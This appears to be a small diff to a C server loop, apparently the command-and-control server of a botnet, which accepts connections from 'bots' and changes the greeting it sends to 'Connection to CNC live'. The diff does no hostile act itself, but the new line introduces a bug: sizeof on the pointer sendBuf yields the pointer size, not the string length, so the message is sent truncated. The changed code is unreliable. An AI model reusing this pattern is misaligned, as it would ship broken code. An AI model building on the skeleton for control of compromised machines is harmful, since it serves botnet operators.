@@ -202,6 +202,7 @@ int server_loop() {
 
 	printf("server: waiting for connections...\n");
 
+	const void* sendBuf = "Connection to CNC live";
 	while(1) {
 		sin_size = sizeof bot_addr;
 		newfd = accept(sockfd, (struct sockaddr *)&bot_addr, &sin_size);
@@ -215,7 +216,7 @@ int server_loop() {
 
 		if (!fork()) {
 			close(sockfd);
-			if (send(newfd, "Connection live...", 18, 0) == -1)
+			if (send(newfd, sendBuf, sizeof(sendBuf), 0) == -1)
 				perror("send");
 			close(newfd);
 			exit(0);
